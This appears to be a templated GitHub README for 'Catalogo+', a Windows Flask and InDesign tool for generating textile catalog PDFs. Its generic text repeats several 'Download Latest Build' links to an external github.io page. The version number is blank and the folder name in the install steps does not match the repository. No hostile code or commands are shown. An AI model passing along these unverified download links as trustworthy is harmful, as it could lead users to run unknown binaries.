# Catalogo+ web app 2026

> **Catalogo+ is a Windows-focused web app for textile catalog automation, combining full-stack workflows with Python, Flask, and Adobe InDesign integration to streamline PDF generation in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylerkrause91/catalogo-plus-win-38223?style=flat-square)](https://github.com/tylerkrause91/catalogo-plus-win-38223)

---

<p align="center">
  <a href="https://tylerkrause91.github.io/catalogo-plus-win-38223/">
    <img src="https://img.shields.io/badge/Download-Catalogo%2B%20Latest-brightgreen?style=for-the-badge" alt="Download Catalogo+">
  </a>
</p>

> **[Direct Download - Catalogo+ v](https://tylerkrause91.github.io/catalogo-plus-win-38223/)**

---

[Download Latest Build](https://tylerkrause91.github.io/catalogo-plus-win-38223/)

---

## About Catalogo+

Catalogo+ is built to support catalog production workflows where layout choices, reference handling, and output generation need to stay coordinated. It brings together a web-based interface and automated publishing steps so teams can move from data to finished catalog files with less manual switching between tools.

The project is aimed at textile and fashion workflows, especially when repeated catalog updates and consistent page structure matter. With real-time preview, modular catalog generation, and PDF output driven by Python and Adobe InDesign, it helps organize the process from content selection through final export.

---

## Features

- Layout selection for catalog composition
- Reference management for organizing source content
- Real-time preview in 9:16 format
- Automatic PDF generation through InDesign integration
- Modular catalog generation for flexible workflows
- Process queue with a global lock for coordinated execution
- Waiting room behavior for users when the system is busy
- Timeout recovery with a kill switch for stalled jobs

---

## Installation

Clone the repository and open it in your preferred environment for Windows-based web app development.

1. Get the source:
   - git clone https://github.com/tylerkrause91/catalogo-plus-win-38223.git
2. Enter the project folder:
   - cd Catalogo_plus
3. Install the Python and Flask dependencies used by the application.
4. Make sure Adobe InDesign and the required automation setup are available before launching PDF-related workflows.

First run typically starts the web application entry point and then loads the catalog management interface in your browser or local environment.

---

## Usage

Typical workflow:

1. Start the Flask application.
2. Load or prepare the catalog data set.
3. Choose a layout for the current catalog.
4. Manage references and related content entries.
5. Review the live preview before finalizing.
6. Send the job through the queue for automated PDF generation.

Example launch pattern:

- python app.py

Once running, use the interface to review status, monitor queued work, and move through the catalog creation stages in order.

---

## Configuration

Settings are expected to live in the application configuration used by the Python/Flask stack and the InDesign automation layer.

Example structure:

    {
      "layout": "default",
      "preview_mode": "9:16",
      "queue_enabled": true,
      "pdf_output": "exports/"
    }

Adjust paths, queue behavior, and output locations to match your environment and catalog workflow.

---

## Requirements

- Windows platform
- Python runtime
- Flask web framework
- Adobe InDesign integration for automated PDF generation
- Storage for catalog assets, references, and exported files
- Network or local access suitable for full-stack web app operation

---

## FAQ

**How do I update Catalogo+?**  
Replace the local files with the latest build from the repository or deployment source, then review any configuration changes before restarting.

**Where are the catalog settings stored?**  
Configuration is handled through the app's Python/Flask setup and related workflow files. Check the project structure for environment and automation settings.

**What should I do if a job is stuck in the queue?**  
Use the queue controls and recovery tools provided by the application. The process queue includes timeout recovery and a kill switch for stalled tasks.

**Can I change layouts after starting a project?**  
Yes. Layout selection is part of the workflow, so you can revise the template choice before final PDF output.

**Who is this project for?**  
It is intended for catalog workflows in textile and fashion contexts where previewing, reference management, and repeated export are part of daily work.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
